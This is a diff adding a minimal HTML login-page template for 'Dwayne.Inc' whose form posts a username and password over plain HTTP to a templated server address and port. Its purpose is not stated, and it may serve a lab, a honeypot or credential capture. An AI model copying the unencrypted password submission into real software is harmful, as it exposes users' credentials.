@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Login Portal Dwayne.Inc</title>
+    </head>
+    <body>
+        <h1>Authorised Access Only</h1>
+        <h2>Login Portal</h2>
+        <form action="http://{{ server_ip }}:{{ port }}" method="POST">
+            Username: <input type="text" name="username" required><br>
+            Password: <input type="password" name="password" required><br>
+            <input type="submit" value="Login">
+        </form>
+    </body>
+</html>
